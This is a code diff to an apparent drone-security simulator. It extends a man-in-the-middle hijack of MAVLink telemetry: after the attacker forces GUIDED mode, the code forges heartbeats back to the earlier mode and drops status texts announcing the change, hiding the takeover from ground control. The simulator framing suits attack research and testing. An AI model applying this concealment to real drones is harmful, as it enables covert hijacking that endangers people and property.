@@ -108,20 +108,32 @@ class StealthModeMask:
     dead), so instead this mask *rewrites* the mode fields on downlink heartbeats
     back to the last mode the vehicle reported before the hijack fired.
 
+    A second, firmware-dependent tell is the ``STATUSTEXT`` some autopilots emit
+    on a mode change (ArduPlane and some copter configs announce the new mode by
+    name, e.g. ``"GUIDED"``). ArduCopter SITL in the default config does not emit
+    one — the heartbeat mask alone hides the switch there — but to stay airtight
+    across firmwares the mask also *drops* any downlink ``STATUSTEXT`` that names
+    the hijack mode once engaged (``hijack_mode_name``).
+
     Conceptually this is the downlink analogue of the uplink
     :data:`~simulator.runtime.vehicle.gcs_cmd_forwarder.GCS_FORWARD_TYPES`
     allowlist: rather than selecting which message *types* pass, it scrubs the
-    one field within an always-forwarded type that would betray the attack.
+    fields (and drops the texts) within always-forwarded types that would betray
+    the attack.
 
     Usage: feed every downlink message to :meth:`observe` while inactive to keep
     the cover mode current, call :meth:`engage` the moment the hijack fires, and
-    route downlink heartbeats through :meth:`mask` thereafter.
+    route every subsequent downlink message through :meth:`mask` thereafter
+    (which returns ``None`` for a message that must be dropped).
     """
 
-    def __init__(self) -> None:
+    def __init__(self, hijack_mode_name: str | None = None) -> None:
         # Encoder used to re-pack the rewritten heartbeat. srcSystem is set from
         # the observed heartbeat so the forged beacon keeps the vehicle's id.
         self._encoder = mavlink.MAVLink(None, srcComponent=200)
+        # Uppercased name of the mode the attacker switches into; any STATUSTEXT
+        # mentioning it is a mode-change announcement that would leak the hijack.
+        self._hijack_mode_name = hijack_mode_name.upper() if hijack_mode_name else None
         self._active = False
         self._cover_base_mode: int | None = None
         self._cover_custom_mode: int | None = None
@@ -142,17 +154,26 @@ class StealthModeMask:
             self._cover_custom_mode,
         )
 
-    def mask(self, msg: MAVMsg) -> MAVMsg:
-        """Return ``msg`` with its mode fields rewritten to the cover mode.
+    def mask(self, msg: MAVMsg) -> MAVMsg | None:
+        """Scrub a downlink message so it cannot betray the hijack.
 
-        Non-heartbeats and heartbeats that already match the cover mode are
-        returned untouched. A heartbeat whose mode diverges is re-encoded with
-        the frozen cover mode so the GCS never sees the switch to GUIDED.
+        Returns the (possibly rewritten) message to forward it, or ``None`` to
+        drop it. While inactive, every message passes untouched. Once engaged:
+
+        - a ``HEARTBEAT`` whose mode diverges from the cover mode is re-encoded
+          with the frozen cover mode (one matching the cover mode passes as-is);
+        - a ``STATUSTEXT`` that names the hijack mode is dropped;
+        - every other message passes untouched.
         """
+        if not self._active:
+            return msg
+        msg_type = msg.get_type()
+        if msg_type == "STATUSTEXT":
+            return None if self._names_hijack_mode(msg) else msg
+        if msg_type != "HEARTBEAT":
+            return msg
         if (
-            not self._active
-            or msg.get_type() != "HEARTBEAT"
-            or self._cover_custom_mode is None
+            self._cover_custom_mode is None
             or self._cover_base_mode is None
             or (
                 msg.custom_mode == self._cover_custom_mode
@@ -172,6 +193,16 @@ class StealthModeMask:
         # Clear any cached raw buffer so the relay re-packs the rewritten fields.
         forged._msgbuf = None
         return forged
+
+    def _names_hijack_mode(self, msg: MAVMsg) -> bool:
+        """True if a STATUSTEXT announces the hijack mode (and must be dropped)."""
+        if self._hijack_mode_name is None:
+            return False
+        text = str(getattr(msg, "text", "")).upper()
+        if self._hijack_mode_name not in text:
+            return False
+        logging.info("MITM stealth: dropping mode-change STATUSTEXT %r", msg.text)
+        return True
 
 
 class BlackoutStrategy(MITMStrategy):
@@ -213,6 +244,7 @@ class HijackStrategy(MITMStrategy):
     """
 
     _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED
+    _GUIDED_MODE_NAME = "GUIDED"  # name scrubbed from mode-change STATUSTEXTs
 
     def __init__(self, params: Params | None = None) -> None:
         super().__init__(params)
@@ -222,7 +254,7 @@ class HijackStrategy(MITMStrategy):
         self.target_alt = float(self.params.get("target_alt", 0.0))
         self.stealth = bool(self.params.get("stealth", 1.0))
         self._fired = False
-        self._mode_mask = StealthModeMask()
+        self._mode_mask = StealthModeMask(hijack_mode_name=self._GUIDED_MODE_NAME)
         # Builder used only to construct message objects (packed by the context).
         self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
 
@@ -297,6 +329,7 @@ class HijackPursuitStrategy(MITMStrategy):
     """
 
     _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED
+    _GUIDED_MODE_NAME = "GUIDED"  # name scrubbed from mode-change STATUSTEXTs
     _POSITION_TYPE_MASK = 0b110111111000  # position only (ignore vel/accel/yaw)
 
     def __init__(self, params: Params | None = None) -> None:
@@ -306,7 +339,7 @@ class HijackPursuitStrategy(MITMStrategy):
         self.update_interval = float(self.params.get("update_interval", 1.0))
         self.stealth = bool(self.params.get("stealth", 1.0))
         self._fired = False
-        self._mode_mask = StealthModeMask()
+        self._mode_mask = StealthModeMask(hijack_mode_name=self._GUIDED_MODE_NAME)
         self._stop = threading.Event()
         self._sniffer: RIDSniffer | None = None
         self._pursue_thread: threading.Thread | None = None
